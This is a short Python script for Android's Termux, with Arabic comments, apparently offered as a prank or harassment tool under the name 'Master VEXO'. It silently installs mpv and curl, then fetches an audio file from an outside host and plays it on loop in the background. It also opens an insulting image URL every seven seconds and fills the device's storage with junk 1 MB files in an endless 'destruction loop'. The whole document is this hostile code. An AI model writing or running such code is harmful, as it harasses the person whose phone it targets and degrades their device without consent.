import os
import time
import random

# --- إعدادات Master VEXO ---
# روابط مباشرة وموثوقة
AUDIO_URL = "https://files.catbox.moe/9f9pzu.mp3"
IMAGE_URL = "https://j.top4top.io/s_3763q07de1.jpg"

def start_chaos():
    print("☣️ [VEXO SYSTEM] PHANTOM ATTACK INITIATED...")
    
    # 1. تثبيت المتطلبات (صامت)
    print("📦 Installing Engine...")
    os.system("pkg install mpv curl -y > /dev/null 2>&1")
    
    # 2. تحميل ملف الصوت وضمان وجوده
    print("🔊 Loading Audio Payload...")
    os.system(f"curl -L -o sound_vexo.mp3 {AUDIO_URL} > /dev/null 2>&1")
    
    # 3. تشغيل الصوت بأعلى صوت ممكن في الخلفية
    # ملاحظة: & تجعل الصوت يعمل ويستمر السكربت في التخريب
    os.system("mpv --loop sound_vexo.mp3 > /dev/null 2>&1 &")

    # 4. حلقة التدمير (صوت + روابط + ذاكرة)
    try:
        count = 1
        while True:
            print(f"🔥 Strike {count}: Target is an idiot!")
            
            # فتح الصورة المستفزة في المتصفح كل 7 ثوانٍ
            os.system(f"termux-open-url {IMAGE_URL}")
            
            # ملء ذاكرة الهاتف بملفات وهمية لزيادة الضغط
            folder = f"VEXO_HACK_{count}"
            os.system(f"mkdir {folder} && dd if=/dev/zero of=./{folder}/data.dat bs=1M count=1 > /dev/null 2>&1")
            
            count += 1
            time.sleep(7) # الفاصل الزمني بين كل "هجمة"
            
    except KeyboardInterrupt:
        # إيقاف كل شيء عند الخروج (للمطور فقط)
        os.system("pkill mpv")
        print("\n🛑 Stopped by Master VEXO.")

if __name__ == "__main__":
    start_chaos()
